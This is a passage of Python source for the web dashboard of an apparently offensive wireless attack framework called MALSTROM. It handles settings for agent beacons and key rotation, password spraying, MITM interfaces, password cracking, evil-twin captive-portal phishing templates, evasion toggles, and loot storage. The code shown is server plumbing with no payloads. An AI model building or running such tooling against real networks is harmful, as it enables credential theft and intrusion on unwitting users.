        scheme = 'https' if config.DASH_TLS else 'http'
        info['lan_url'] = '%s://%s:%d' % (scheme, base, config.DASH_PORT)
        info['dash_tls'] = config.DASH_TLS
        info['dash_port'] = config.DASH_PORT
        info['portal_ip'] = config.PORTAL_IP
        info['portal_port'] = config.PORTAL_PORT
        s = state.read_settings()
        info['auth_enabled'] = state.auth_enabled()
        info['settings'] = {
            'beacon_interval': int(s.get('beacon_interval') or config.BEACON_INTERVAL),
            'beacon_maxout': int(s.get('beacon_maxout') or config.BEACON_MAXOUT),
            'scan_range': s.get('scan_range') or config.SCAN_PORT_RANGE,
            'spray_limit': int(s.get('spray_limit') or config.SPRAY_LIMIT),
            'mitm_iface': s.get('mitm_iface') or config.MITM_IFACE,
            'wlan_dev': s.get('wlan_dev') or config.WLAN_DEV,
            'crack_wordlist': s.get('crack_wordlist') or config.CRACK_WORDLIST,
            'portal_ssid': state.get_portal_ssid(),
            'beacon_rotate': int(s.get('beacon_rotate') or config.BEACON_ROTATE),
            'ssid_cloak': bool(s.get('ssid_cloak', config.SSID_CLOAK)),
        }
        svc = self.app.sysinfo() if self.app else {}
        info['runtime'] = {
            'version': svc.get('version', '?'),
            'state_dir': config.STATE_DIR,
            'loot_dir': config.LOOT_DIR,
            'scan_bin': config.SCAN_BIN,
            'netexec_bin': config.NETEXEC_BIN,
            'responder_bin': config.RESPONDER_BIN,
        }
        self._json(info)

    def _action_settings_set(self):
        s = state.read_settings()
        got = {}
        bi = self._q('beacon_interval')
        if bi:
            try:
                bi = int(bi)
                if not 1 <= bi <= 3600:
                    raise ValueError
                s['beacon_interval'] = bi
                got['beacon_interval'] = bi
            except ValueError:
                self._json({'ok': 0, 'error': 'beacon_interval must be 1..3600'})
                return
        sr = self._q('scan_range')
        if sr:
            import re as _re
            if not _re.fullmatch(r'\d+(-\d+)?', sr):
                self._json({'ok': 0, 'error': 'scan_range must look like 1-1000'})
                return
            s['scan_range'] = sr
            got['scan_range'] = sr
        mo = self._q('beacon_maxout')
        if mo:
            try:
                mo = int(mo)
                if not 4096 <= mo <= 16 * 1024 * 1024:
                    raise ValueError
                s['beacon_maxout'] = mo
                got['beacon_maxout'] = mo
            except ValueError:
                self._json({'ok': 0, 'error': 'beacon_maxout must be 4096..16777216'})
                return
        sl = self._q('spray_limit')
        if sl:
            try:
                sl = int(sl)
                if not 1 <= sl <= 100:
                    raise ValueError
                s['spray_limit'] = sl
                got['spray_limit'] = sl
            except ValueError:
                self._json({'ok': 0, 'error': 'spray_limit must be 1..100'})
                return
        mi = self._q('mitm_iface')
        if mi or mi == '':
            if mi and not all(c.isalnum() or c in '._-:' for c in mi):
                self._json({'ok': 0, 'error': 'mitm_iface has illegal characters'})
                return
            s['mitm_iface'] = mi or ''
            got['mitm_iface'] = mi or ''
        wd = self._q('wlan_dev')
        if wd or wd == '':
            if wd and not all(c.isalnum() or c in '._-' for c in wd):
                self._json({'ok': 0, 'error': 'wlan_dev has illegal characters'})
                return
            s['wlan_dev'] = wd or ''
            got['wlan_dev'] = wd or ''
        cw = self._q('crack_wordlist')
        if cw or cw == '':
            cw = cw.strip()
            if cw and ('//' in cw or any(c in cw for c in '\n\r\x00')):
                self._json({'ok': 0, 'error': 'crack_wordlist is not a path'})
                return
            s['crack_wordlist'] = cw
            got['crack_wordlist'] = cw or '(auto-detect)'
        ps = self._q('portal_ssid')
        src = self._raw_body if getattr(self, '_raw_body', None) else self._query()
        if 'portal_ssid' in src:
            if len(ps) > 32 or any(ord(c) < 32 for c in ps):
                self._json({'ok': 0, 'error': 'portal_ssid must be 32 chars or fewer'})
                return
            state.set_portal_ssid(ps)
            got['portal_ssid'] = ps
        if 'auth_enabled' in src:
            on = src['auth_enabled'][0] not in ('0', 'false', 'off')
            state.set_auth_enabled(on)
            s['auth_enabled'] = on
            got['auth_enabled'] = on
            if on:
                state.clear_sessions()
            state.emit('ALERT', 'dashboard auth gate %s — %s' % (
                'ENABLED' if on else 'DISABLED',
                'token required to sign in' if on else
                'anyone can open the dashboard'))
        if not got:
            self._json({'ok': 0, 'error': 'nothing to set'})
            return
        src = self._raw_body if getattr(self, '_raw_body', None) else self._query()
        # Beacon fidelity / evasion toggles mount the persistent settings AND
        # the live engagement state, so flipping them mid-engagement takes
        # effect on the next engine pass (cloak change re-clones the twin;
        # rotation honours the new interval).
        if 'beacon_rotate' in src:
            try:
                rot = int(str(src['beacon_rotate'][0]).strip() or 0)
                if rot != 0 and not 5 <= rot <= 1440:
                    raise ValueError
            except ValueError:
                self._json({'ok': 0,
                            'error': 'beacon_rotate must be 0 (off) or 5-1440 minutes'})
                return
            s['beacon_rotate'] = rot
            got['beacon_rotate'] = rot
        if 'ssid_cloak' in src:
            cloak = str(src['ssid_cloak'][0]) not in ('0', 'false', 'off')
            s['ssid_cloak'] = cloak
            got['ssid_cloak'] = cloak
        if 'beacon_rotate' in got or 'ssid_cloak' in got:
            st = state.load_state()
            st['beacon_rotate'] = int(s.get('beacon_rotate') or config.BEACON_ROTATE)
            st['ssid_cloak'] = bool(s.get('ssid_cloak', config.SSID_CLOAK))
            state.write_state(st)
        state.write_settings(s)
        state.emit('INFO', 'settings updated: %s' % ', '.join(
            '%s=%s' % (k, v) for k, v in got.items()))
        self._json({'ok': 1, 'auth_enabled': state.auth_enabled(),
                    'settings': {
            'beacon_interval': int(s.get('beacon_interval') or config.BEACON_INTERVAL),
            'beacon_maxout': int(s.get('beacon_maxout') or config.BEACON_MAXOUT),
            'scan_range': s.get('scan_range') or config.SCAN_PORT_RANGE,
            'spray_limit': int(s.get('spray_limit') or config.SPRAY_LIMIT),
            'mitm_iface': s.get('mitm_iface') or config.MITM_IFACE,
            'wlan_dev': s.get('wlan_dev') or config.WLAN_DEV,
            'crack_wordlist': s.get('crack_wordlist') or config.CRACK_WORDLIST,
            'portal_ssid': state.get_portal_ssid(),
            'beacon_rotate': int(s.get('beacon_rotate') or config.BEACON_ROTATE),
            'ssid_cloak': bool(s.get('ssid_cloak', config.SSID_CLOAK)),
        }})

    def _action_key_rotate(self):
        key = state.rotate_beacon_key()
        state.emit('MITM', 'beacon key rotated — agents must fetch fresh payloads')
        self._json({'ok': 1, 'key': key})

    def _action_alerts(self):
        lines = []
        try:
            with open(state.EVENTS_FILE) as fh:
                for line in fh:
                    try:
                        e = json.loads(line)
                    except ValueError:
                        continue
                    if e.get('type') == 'ALERT':
                        lines.append(e)
        except IOError:
            pass
        self._json({'ok': 1, 'alerts': lines[-50:]})

    def _action_templates(self):
        names = state.custom_templates()
        try:
            for f in os.listdir(config.TEMPLATES_DIR):
                if f.endswith('.html'):
                    names.append(f[:-5])
        except OSError:
            pass
        names = list(dict.fromkeys(names))
        names.sort()
        self._json({'ok': 1, 'templates': names, 'custom': state.custom_templates()})

    def _action_template(self):
        name = self._q('name', 'wifi_login')
        path = None
        for base in (config.CUSTOM_TEMPLATES_DIR, config.TEMPLATES_DIR):
            candidate = os.path.join(base, name + '.html')
            if os.path.exists(candidate):
                path = candidate
                break
        if not path:
            self._json({'ok': 1, 'html': ''})
            return
        try:
            with open(path, encoding='utf-8') as fh:
                body = fh.read()
        except (IOError, OSError):
            self._json({'ok': 1, 'html': ''})
            return
        ssid = html.escape(state.get_current_ssid() or 'MALSTROM-NET', quote=True)
        body = body.replace('__MALSTROM_SSID__', ssid)
        body = body.replace('__MALSTROM_TARGET__',
                            html.escape(config.REDIRECT_TARGET, quote=True))
        self._json({'ok': 1, 'html': body})

    def _action_scan(self):
        """Live 802.11 recon pass (target picker for the kill chain)."""
        res = recon.scan_wifi(timeout=15)
        self._json(res)

    def _action_events(self):
        if not self._authed():
            self._json({'ok': 0, 'error': 'auth required'})
            return
        srv = getattr(self, 'server', None)
        if srv is not None and hasattr(srv, 'sse_enter'):
            srv.sse_enter()
        try:
            self._stream_events()
        finally:
            if srv is not None and hasattr(srv, 'sse_leave'):
                srv.sse_leave()

    def _stream_events(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/event-stream; charset=utf-8')
        self.send_header('Cache-Control', 'no-cache')
        self.send_header('Connection', 'keep-alive')
        self._sec_headers()
        self.end_headers()
        try:
            self.wfile.write(b'data: {"ts":"","type":"INFO","msg":"MALSTROM stream connected"}\n\n')
            self.wfile.flush()
        except OSError:
            return
        fh = None
        try:
            fh = open(state.EVENTS_FILE, 'r')
            fh.seek(0, 2)
            pos = fh.tell()
        except IOError:
            pos = 0
        last_mirror = time.time()
        while True:
            try:
                if fh is None:
                    try:
                        fh = open(state.EVENTS_FILE, 'r')
                        fh.seek(0, 2)
                        pos = fh.tell()
                    except IOError:
                        time.sleep(1)
                        continue
                new = fh.read()
                if new:
                    for line in new.splitlines():
                        if line:
                            self.wfile.write(('data: %s\n\n' % line).encode('utf-8'))
                    pos = fh.tell()
                    now = time.time()
                    if now - last_mirror > 5:
                        state.mirror_loot()
                        last_mirror = now
                elif pos > 0 and not new:
                    pass
                self.wfile.write(b': ping\n\n')
                self.wfile.flush()
                time.sleep(1)
            except (OSError, ConnectionResetError, BrokenPipeError, TimeoutError):
                if fh:
                    try:
                        fh.close()
                    except Exception:
                        pass
                return

    def _action_ping(self):
        """Cheap operator-presence heartbeat from the dashboard page."""
        srv = getattr(self, 'server', None)
        if srv is not None and hasattr(srv, 'note_seen'):
            srv.note_seen()
        self._json({'ok': 1})

    # --- dashboard --------------------------------------------------------------
    def _action_log(self):
        try:
            n = max(1, min(int(self._q('n', '15')), 200))
        except (TypeError, ValueError):
            n = 15
        lines = []
        try:
            with open(state.EVENTS_FILE, 'rb') as fh:
                fh.seek(0, 2)
                size = fh.tell()
                chunk = min(size, n * 500)
                fh.seek(max(0, size - chunk))
                tail = fh.read().decode('utf-8', 'replace')
                lines = tail.splitlines()[-n:]
        except IOError:
            pass
        out = []
        for ln in lines[-n:]:
            try:
                out.append(json.loads(ln))
            except ValueError:
                continue
        self._json({'ok': 1, 'events': out})

    # --- dispatch ---------------------------------------------------------------
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == '/cgi-bin/api.sh':
            action = self._q('action')
            handler = getattr(self, '_action_' + action, None)
            if not handler:
                self._json({'ok': 0, 'error': 'unknown action'})
                return
            if not self._origin_ok():
                self._json({'ok': 0, 'error': 'cross-site request rejected'})
                return
            if action in ('challenge', 'auth'):
                handler()
                return
            if action == 'events':
                handler()
                return
            if not self._authed():
                self._deny()
                return
            handler()
            self._audit_mutating(action)
            return
        self._static()

    def do_POST(self):
        """Support template upload (urlencoded form body) at the API end."""
        path = urllib.parse.urlparse(self.path).path
        if path != '/cgi-bin/api.sh':
            self.send_error(404)
            return
        if not self._origin_ok():
            self._json({'ok': 0, 'error': 'cross-site request rejected'})
            return
        header = self.headers.get('Content-Length')
        length = int(header.strip()) if header and header.strip().isdigit() else 0
        if not header or length <= 0 or length > POST_BODY_CAP:
            # Missing/chunked/oversized framing: we can't read the whole body,
            # so don't let leftover bytes smear into a keep-alive request
            # (desync/smuggling) — answer and close instead of trusting it.
            self.close_connection = True
            if length > POST_BODY_CAP:
                self.send_error(413)
                return
            raw = ''
        else:
            raw = self.rfile.read(length).decode('utf-8', 'replace')
        self._raw_body = urllib.parse.parse_qs(raw, keep_blank_values=True)
        for k, v in self._query().items():
            if k not in self._raw_body:
                self._raw_body[k] = v
        action = self._raw_body.get('action', ['save_template'])[0]
        handler = getattr(self, '_action_' + action, None)
        if not handler:
            self._json({'ok': 0, 'error': 'unknown action'})
            return
        if action != 'save_template':
            self._json({'ok': 0, 'error': 'POST only allowed for save_template'})
            return
        if not self._authed():
            self._deny()
            return
        handler()
        self._audit_mutating(action)

    def _q(self, name, default=''):
        if getattr(self, '_raw_body', None):
            return self._raw_body.get(name, [default])[0]
        return self._query().get(name, [default])[0]

    def do_HEAD(self):
        self.do_GET()


def _ensure_dash_cert():
    """(cert, key) paths for the TLS dashboard, generated once via openssl.

    Returns (None, None) when openssl is unavailable or generation fails —
    the caller then serves the dashboard over plaintext with an ALERT.
    """
    cert = os.path.join(config.STATE_DIR, 'dash-cert.pem')
    key = os.path.join(config.STATE_DIR, 'dash-key.pem')
    if os.path.isfile(cert) and os.path.isfile(key):
        return cert, key
    if not linuxutil.have('openssl'):
        return None, None
    r = linuxutil.run(
        ['openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-sha256',
         '-days', '3650', '-nodes', '-subj', '/CN=malstrom-dashboard',
         '-addext', 'subjectAltName=DNS:localhost,IP:127.0.0.1',
         '-keyout', key, '-out', cert], timeout=30)
    if r.returncode != 0 or not (os.path.isfile(cert) and os.path.isfile(key)):
        return None, None
    try:
        os.chmod(key, 0o600)
    except OSError:
        pass
    return cert, key


class DashServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, app):
        super().__init__((config.DASH_HOST, config.DASH_PORT), DashHandler)
        DashHandler.app = app
        self._sse_lock = threading.Lock()
        self._sse_clients = 0
        self._last_seen = time.time()

    def sse_enter(self):
        with self._sse_lock:
            self._sse_clients += 1
            self._last_seen = time.time()

    def sse_leave(self):
        with self._sse_lock:
            self._sse_clients = max(0, self._sse_clients - 1)

    def note_seen(self):
        with self._sse_lock:
            self._last_seen = time.time()

    def presence_stats(self):
        with self._sse_lock:
            return {'clients': self._sse_clients, 'last_seen': self._last_seen}

    def handle_error(self, request, client_address):
        exc = sys.exc_info()[1]
        if isinstance(exc, (ConnectionResetError, BrokenPipeError,
                            TimeoutError, socket.timeout)):
            return
        super().handle_error(request, client_address)


def serve(app):
    """Start the dashboard, falling back over a small port range.

    A busy DASH_PORT must not crash the daemon — under systemd Restart=on-failure
    that becomes an infinite restart loop (and in app mode it wedges the idle
    watchdog). Try DASH_PORT..+FALLBACKS; remember the resolved port in the
    state dir so the `malstrom open/passwd` CUI prints the real URL. Returns
    (server, thread); both None if no port in the range was free.
    """
    base = config.DASH_PORT
    server = None
    last = None
    for i in range(config.DASH_PORT_FALLBACKS):
        try:
            config.DASH_PORT = base + i
            server = DashServer(app)
            break
        except OSError as exc:
            last = exc
            continue
    if server is None:
        state.emit('ALERT', 'dashboard bind failed (ports %d-%d all busy): %s'
                   % (base, base + config.DASH_PORT_FALLBACKS - 1, last))
        return None, None
    if config.DASH_PORT != base:
        state.emit('INFO', 'dashboard port %d busy — using %d' % (
            base, config.DASH_PORT))
    if config.DASH_TLS:
        cert, key = _ensure_dash_cert()
        if cert:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(cert, key)
                server.socket = ctx.wrap_socket(server.socket, server_side=True)
                state.emit('INFO', 'dashboard serving over TLS '
                                   '(self-signed, https://%s:%d)'
                           % (config.DASH_HOST, config.DASH_PORT))
            except (OSError, ssl.SSLError):
                state.emit('ALERT', 'dashboard TLS wrap failed — '
                                    'serving plaintext')
        else:
            state.emit('ALERT', 'dashboard TLS requested but cert could not '
                                'be generated (openssl missing?) — serving '
                                'plaintext')
    try:
        with open(state.DASH_PORT_FILE, 'w') as fh:
            fh.write('%d\n' % config.DASH_PORT)
    except OSError:
        pass
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread